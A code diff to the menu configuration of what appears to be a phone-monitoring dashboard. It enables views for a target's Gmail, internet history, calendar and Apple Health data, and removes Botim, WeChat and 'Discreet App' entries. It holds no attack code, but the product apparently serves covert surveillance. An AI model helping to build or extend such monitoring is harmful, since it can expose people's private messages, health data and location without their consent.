@@ -28,9 +28,8 @@ import {
   FaSnapchat,
   FaHeartPulse,
   FaLinkedin,
-  FaMask,
 } from "react-icons/fa6";
-import { RiWhatsappFill, RiWechatFill } from "react-icons/ri";
+import { RiWhatsappFill } from "react-icons/ri";
 // constant
 const icons = {
   FaPhone,
@@ -61,9 +60,7 @@ const icons = {
   FaSnapchat,
   FaHeartPulse,
   FaLinkedin,
-  FaMask,
   RiWhatsappFill,
-  RiWechatFill,
 };
 
 // ==============================|| UTILITIES MENU ITEMS ||============================== //
@@ -103,14 +100,14 @@ const utilities = {
           icon: icons.FaCommentSms,
           breadcrumbs: false,
         },
-        // {
-        //   id: "gmail-logs",
-        //   title: "Gmail",
-        //   type: "item",
-        //   url: "/user/gmail",
-        //   icon: icons.FaEnvelope,
-        //   breadcrumbs: false,
-        // },
+        {
+          id: "gmail-logs",
+          title: "Gmail",
+          type: "item",
+          url: "/user/gmail",
+          icon: icons.FaEnvelope,
+          breadcrumbs: false,
+        },
         {
           id: "contacts-logs",
           title: "Contacts",
@@ -119,30 +116,30 @@ const utilities = {
           icon: icons.FaAddressBook,
           breadcrumbs: false,
         },
-        // {
-        //   id: "internet-history-logs",
-        //   title: "Internet History",
-        //   type: "item",
-        //   url: "/user/internet-history",
-        //   icon: icons.FaClockRotateLeft,
-        //   breadcrumbs: false,
-        // },
-        // {
-        //   id: "calendar-logs",
-        //   title: "Calendar",
-        //   type: "item",
-        //   url: "/user/calendar",
-        //   icon: icons.FaCalendarDays,
-        //   breadcrumbs: false,
-        // },
-        // {
-        //   id: "apple-health",
-        //   title: "Apple Health",
-        //   type: "item",
-        //   url: "/user/apple-health",
-        //   icon: icons.FaHeartPulse,
-        //   breadcrumbs: false,
-        // },
+        {
+          id: "internet-history-logs",
+          title: "Internet History",
+          type: "item",
+          url: "/user/internet-history",
+          icon: icons.FaClockRotateLeft,
+          breadcrumbs: false,
+        },
+        {
+          id: "calendar-logs",
+          title: "Calendar",
+          type: "item",
+          url: "/user/calendar",
+          icon: icons.FaCalendarDays,
+          breadcrumbs: false,
+        },
+        {
+          id: "apple-health",
+          title: "Apple Health",
+          type: "item",
+          url: "/user/apple-health",
+          icon: icons.FaHeartPulse,
+          breadcrumbs: false,
+        },
       ],
     },
     {
@@ -174,22 +171,6 @@ const utilities = {
           url: "/user/signal",
           breadcrumbs: false,
           icon: icons.FaSignalMessenger,
-        },
-        {
-          id: "botim-logs",
-          title: "Botim",
-          type: "item",
-          url: "/user/botim",
-          breadcrumbs: false,
-          icon: icons.FaComments,
-        },
-        {
-          id: "wechat-logs",
-          title: "WeChat",
-          type: "item",
-          url: "/user/wechat",
-          breadcrumbs: false,
-          icon: icons.RiWechatFill,
         },
         // {
         //   id: "skype-logs",
@@ -282,14 +263,6 @@ const utilities = {
     //   breadcrumbs: false,
     // },
     {
-      id: "discreet-app",
-      title: "Discreet App",
-      type: "item",
-      url: "/user/discreet-app",
-      icon: icons.FaMask,
-      breadcrumbs: false,
-    },
-    {
       id: "location",
       title: "Location",
       type: "item",
@@ -313,15 +286,14 @@ const utilities = {
     //   icon: icons.FaMicrophone,
     //   breadcrumbs: false,
     // },
-    {
-      id: "wifinetwork",
-      title: "WiFi Network",
-      type: "item",
-      url: "/user/wifinetwork",
-      icon: icons.FaWifi,
-      breadcrumbs: false,
-    },
-
+    // {
+    //   id: "wifinetwork",
+    //   title: "WiFi Network",
+    //   type: "item",
+    //   url: "/user/wifinetwork",
+    //   icon: icons.FaWifi,
+    //   breadcrumbs: false,
+    // },
     // {
     //   id: "remotecontrol",
     //   title: "Remote Control",
